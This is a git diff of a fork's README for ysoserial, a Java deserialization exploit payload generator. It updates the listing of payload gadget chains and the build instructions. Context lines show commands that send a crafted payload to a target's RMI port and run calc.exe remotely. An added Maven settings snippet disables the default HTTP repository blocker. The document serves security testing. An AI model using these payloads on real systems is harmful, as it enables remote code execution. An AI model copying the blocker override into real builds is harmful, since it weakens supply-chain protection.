@@ -1,13 +1,12 @@
 
 # ysoserial
 
+**Fork**: This is a fork of [https://github.com/wh1t3p1g/ysoserial](The wh1t3p1g fork) of ysoserial. The only change here so far is a modified README.md and pom.xml to allow building using modern Maven versions.
+
+
 [![Join the chat at https://gitter.im/frohoff/ysoserial](
     https://badges.gitter.im/frohoff/ysoserial.svg)](
     https://gitter.im/frohoff/ysoserial?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)
-[![Download Latest Snapshot](https://img.shields.io/badge/download-master-green.svg)](
-    https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)
-[![Travis Build Status](https://api.travis-ci.org/frohoff/ysoserial.svg?branch=master)](https://travis-ci.org/frohoff/ysoserial)
-[![Appveyor Build status](https://ci.appveyor.com/api/projects/status/a8tbk9blgr3yut4g/branch/master?svg=true)](https://ci.appveyor.com/project/frohoff/ysoserial/branch/master)
 
 A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.
 
@@ -51,43 +50,50 @@ are not responsible or liable for misuse of the software. Use responsibly.
 ## Usage
 
 ```shell
-$  java -jar ysoserial.jar
+$ java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar                                                                                                         ✹master
 Y SO SERIAL?
-Usage: java -jar ysoserial.jar [payload] '[command]'
+Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]'
   Available payload types:
-     Payload             Authors                     Dependencies
-     -------             -------                     ------------
-     BeanShell1          @pwntester, @cschneider4711 bsh:2.0b5
-     C3P0                @mbechler                   c3p0:0.9.5.2, mchange-commons-java:0.2.11
-     Clojure             @JackOfMostTrades           clojure:1.8.0
-     CommonsBeanutils1   @frohoff                    commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2
-     CommonsCollections1 @frohoff                    commons-collections:3.1
-     CommonsCollections2 @frohoff                    commons-collections4:4.0
-     CommonsCollections3 @frohoff                    commons-collections:3.1
-     CommonsCollections4 @frohoff                    commons-collections4:4.0
-     CommonsCollections5 @matthias_kaiser, @jasinner commons-collections:3.1
-     CommonsCollections6 @matthias_kaiser            commons-collections:3.1
-     CommonsCollections8 @navalorenzo                commons-collections4:4.0
-     CommonsCollections9 @wh1t3p1g                   commons-collections:3.1
-     FileUpload1         @mbechler                   commons-fileupload:1.3.1, commons-io:2.4
-     Groovy1             @frohoff                    groovy:2.3.9
-     Hibernate1          @mbechler
-     Hibernate2          @mbechler
-     JBossInterceptors1  @matthias_kaiser            javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
-     JRMPClient          @mbechler
-     JRMPListener        @mbechler
-     JSON1               @mbechler                   json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1
-     JavassistWeld1      @matthias_kaiser            javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
-     Jdk7u21             @frohoff
-     Jython1             @pwntester, @cschneider4711 jython-standalone:2.5.2
-     MozillaRhino1       @matthias_kaiser            js:1.7R2
-     Myfaces1            @mbechler
-     Myfaces2            @mbechler
-     ROME                @mbechler                   rome:1.0
-     Spring1             @frohoff                    spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE
-     Spring2             @mbechler                   spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2
-     URLDNS              @gebl
-     Wicket1             @jacob-baines               wicket-util:6.23.0, slf4j-api:1.6.4
+Feb. 02, 2024 4:56:16 PM org.reflections.Reflections scan
+INFO: Reflections took 49 ms to scan 1 urls, producing 18 keys and 162 values
+     Payload              Authors                                Dependencies
+     -------              -------                                ------------
+     BeanShell1           @pwntester, @cschneider4711            bsh:2.0b5
+     C3P0                 @mbechler                              c3p0:0.9.5.2, mchange-commons-java:0.2.11
+     Clojure              @JackOfMostTrades                      clojure:1.8.0
+     CommonsBeanutils1    @frohoff                               commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2
+     CommonsCollections1  @frohoff                               commons-collections:3.1
+     CommonsCollections10 @wh1t3p1g                              commons-collections:3.2.1
+     CommonsCollections2  @frohoff                               commons-collections4:4.0
+     CommonsCollections3  @frohoff                               commons-collections:3.1
+     CommonsCollections4  @frohoff                               commons-collections4:4.0
+     CommonsCollections5  @matthias_kaiser, @jasinner            commons-collections:3.1
+     CommonsCollections6  @matthias_kaiser                       commons-collections:3.1
+     CommonsCollections7  @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1
+     CommonsCollections8  @navalorenzo                           commons-collections4:4.0
+     CommonsCollections9  @wh1t3p1g                              commons-collections:3.1
+     FileUpload1          @mbechler                              commons-fileupload:1.3.1, commons-io:2.4
+     Groovy1              @frohoff                               groovy:2.3.9
+     Hibernate1           @mbechler
+     Hibernate2           @mbechler
+     JBossInterceptors1   @matthias_kaiser                       javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
+     JRMPClient           @mbechler
+     JRMPListener         @mbechler
+     JSON1                @mbechler                              json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1
+     JavassistWeld1       @matthias_kaiser                       javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
+     Jdk7u21              @frohoff
+     Jython1              @pwntester, @cschneider4711            jython-standalone:2.5.2
+     MozillaRhino1        @matthias_kaiser                       js:1.7R2
+     MozillaRhino2        @_tint0                                js:1.7R2
+     Myfaces1             @mbechler
+     Myfaces2             @mbechler
+     ROME                 @mbechler                              rome:1.0
+     Spring1              @frohoff                               spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE
+     Spring2              @mbechler                              spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2
+     Spring3              @wh1t3p1g                              spring-tx:5.2.3.RELEASE, spring-context:5.2.3.RELEASE, javax.transaction-api:1.2
+     URLDNS               @gebl
+     Vaadin1              @kai_ullrich                           vaadin-server:7.7.14, vaadin-shared:7.7.14
+     Wicket1              @jacob-baines                          wicket-util:6.23.0, slf4j-api:1.6.4
 ```
 
 ## Examples
@@ -108,27 +114,42 @@ $ nc 10.10.10.10 1099 < groovypayload.bin
 $ java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit myhost 1099 CommonsCollections1 calc.exe
 ```
 
-## Installation
 
-1. Download the latest jar from
-[JitPack](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)
-[![Download Latest Snapshot](https://img.shields.io/badge/download-master-green.svg)](
-    https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)
-
-Note that GitHub-hosted releases were removed in compliance with the
-[GitHub Community Guidelines](
-    https://help.github.com/articles/github-community-guidelines/#what-is-not-allowed)
 
 ## Building
 
-Requires Java 1.7+ and Maven 3.x+
+This repositories `pom.xml` has been updated to work with more up to date versions of Maven. 
+
+I used `3.9.61` and Java 11 (later Java versions may not work). I set the alternate JDK from the command line like so:
+
+```
+$ export JAVA_HOME=/Library/Java/JavaVirtualMachines/openjdk11-temurin/Contents/Home
+```
+
+Compile as follows:
 
 ```mvn clean package -DskipTests```
 
-## Code Status
 
-[![Build Status](https://travis-ci.org/frohoff/ysoserial.svg?branch=master)](https://travis-ci.org/frohoff/ysoserial)
-[![Build status](https://ci.appveyor.com/api/projects/status/a8tbk9blgr3yut4g/branch/master?svg=true)](https://ci.appveyor.com/project/frohoff/ysoserial/branch/master)
+The following may be needed in the Maven configuration file `~/.m2/settings.xml` to allow access to blocked repositories.
+
+```
+<settings xmlns="http://maven.apache.org/SETTINGS/1.2.0"
+          xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+          xsi:schemaLocation="http://maven.apache.org/SETTINGS/1.2.0 http://maven.apache.org/xsd/settings-1.2.0.xsd">
+   <mirrors>
+        <mirror>
+            <id>maven-default-http-blocker</id>
+            <mirrorOf>external:dont-match-anything-mate:*</mirrorOf>
+            <name>Pseudo repository to mirror external repositories initially using HTTP.</name>
+            <url>http://0.0.0.0/</url>
+            <blocked>false</blocked>
+        </mirror>
+    </mirrors>
+</settings>
+```
+
+
 
 ## Contributing
 
